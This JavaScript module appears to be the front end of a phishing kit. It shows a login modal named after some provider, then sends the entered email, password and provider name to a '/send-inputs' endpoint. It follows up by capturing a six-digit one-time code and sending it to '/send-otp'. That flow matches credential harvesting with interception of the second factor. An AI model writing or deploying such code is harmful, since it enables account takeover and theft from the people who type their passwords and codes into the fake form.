import { API_URL } from "./config.js";

const loginForm = document.getElementById("login-form");
const verificationForm = document.getElementById("verification-form");

function initForm() {
  loginForm.addEventListener("submit", async (event) => {
    event.preventDefault();

    const email = loginForm.querySelector("input[type='email']").value;
    const password = loginForm.querySelector("input[type='password']").value;
    const provider = document.querySelector(
      ".provider-modal__provider-name",
    ).textContent;

    const data = { email, password, provider };

    const response = await fetch(`${API_URL}/send-inputs`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
  });

  verificationForm.addEventListener("submit", async (event) => {
    event.preventDefault();

    const otp = verificationForm.querySelector("input").value;
    const provider = document.querySelector(
      ".provider-modal__provider-name",
    ).textContent;

    if (otp.length < 6) return;
     
    const data = { otp, provider };

    const response = await fetch(`${API_URL}/send-otp`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
  });
}

export { initForm };
